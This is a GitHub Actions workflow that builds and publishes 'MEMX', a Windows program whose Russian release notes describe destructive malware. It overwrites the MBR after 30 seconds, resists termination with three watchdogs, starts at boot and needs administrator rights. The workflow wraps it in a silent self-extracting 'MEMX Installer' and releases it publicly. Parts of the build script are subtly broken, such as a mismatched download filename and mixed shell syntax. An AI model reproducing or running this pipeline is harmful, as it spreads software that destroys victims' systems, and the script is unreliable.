name: Build MEMX

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    
    - name: Setup MSVC
      uses: microsoft/setup-msbuild@v2
    
    - name: Setup NASM
      uses: ilammy/setup-nasm@v1
    
    - name: Compile MEMX
      run: |
        call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat" x64
        cl /EHsc /std:c++17 main.cpp effects.cpp watchdog.cpp mbr.cpp /link user32.lib gdi32.lib winmm.lib winioctl.lib shell32.lib ole32.lib uuid.lib /SUBSYSTEM:WINDOWS /OUT:memx.exe
        
    - name: Create SFX Archive
      run: |
        copy memx.exe memx_packed.exe
        echo "MEMX - ABSOLUTE PIZDEC" > readme.txt
        echo "Run as administrator!" >> readme.txt
        
        # Create self-extracting archive using WinRAR SFX
        curl -L -o rar.exe https://www.rarlab.com/rar/winrar-x64-701.exe
        winrar-x64-701.exe /S
        
        # Create SFX config
        (
          echo;Setup=memx_packed.exe
          echo;Silent=1
          echo;Overwrite=1
          echo;Title=MEMX Installer
          echo;Text=MEMX - ABSOLUTE PIZDEC
        ) > config.txt
        
        rar a -sfx -zconfig.txt memx_sfx.exe memx_packed.exe readme.txt
        
    - name: Upload EXE
      uses: actions/upload-artifact@v4
      with:
        name: memx
        path: memx.exe
        
    - name: Upload SFX
      uses: actions/upload-artifact@v4
      with:
        name: memx-sfx
        path: memx_sfx.exe
        
    - name: Create Release
      if: github.event_name == 'push'
      uses: softprops/action-gh-release@v1
      with:
        files: |
          memx.exe
          memx_sfx.exe
        tag_name: v1.0.${{ github.run_number }}
        name: MEMX v1.0.${{ github.run_number }}
        body: |
          # MEMX - ABSOLUTE PIZDEC
          
          ## Что внутри:
          - 29 ультра-эффектов
          - Защита от завершения (3 watchdog)
          - Запись в MBR через 30 секунд
          - Автозапуск при старте Windows
          
          ## Запуск:
          1. Запусти от имени администратора
          2. Наслаждайся пи****м
          
          ## ВНИМАНИЕ:
          - ТОЛЬКО ДЛЯ ВИРТУАЛКИ!
          - УНИЧТОЖАЕТ MBR!
          - Восстановление через загрузочную флешку!
        draft: false
        prerelease: false
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}